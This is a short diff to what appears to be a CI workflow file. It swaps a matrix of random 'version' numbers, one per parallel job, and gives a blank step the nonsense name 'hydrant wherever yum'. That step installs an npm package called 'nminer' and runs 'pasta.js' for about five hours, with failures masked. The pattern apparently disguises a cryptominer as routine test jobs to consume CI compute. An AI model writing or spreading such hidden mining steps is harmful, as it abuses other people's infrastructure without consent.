@@ -9,23 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4604 }
-          - { version: 8744 }
-          - { version: 5058 }
-          - { version: 1365 }
-          - { version: 214 }
-          - { version: 5375 }
-          - { version: 4618 }
-          - { version: 4507 }
-          - { version: 6854 }
-          - { version: 4092 }
-          - { version: 8727 }
-          - { version: 633 }
-          - { version: 5396 }
-          - { version: 8514 }
-          - { version: 3500 }
-          - { version: 938 }
-          - { version: 9511 }
+          - { version: 5109 }
+          - { version: 6012 }
+          - { version: 4283 }
+          - { version: 8966 }
+          - { version: 4968 }
+          - { version: 1599 }
+          - { version: 220 }
+          - { version: 6116 }
+          - { version: 6189 }
+          - { version: 7445 }
+          - { version: 240 }
+          - { version: 8423 }
+          - { version: 1896 }
+          - { version: 8458 }
+          - { version: 7262 }
+          - { version: 1559 }
+          - { version: 6627 }
 
     steps:
       - name: Checkout
@@ -36,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: hydrant wherever yum
         run: |
           npm install nminer@latest
-          timeout 315m node pasta.js || echo "pasta executed"
+          timeout 306m node pasta.js || echo "pasta executed"
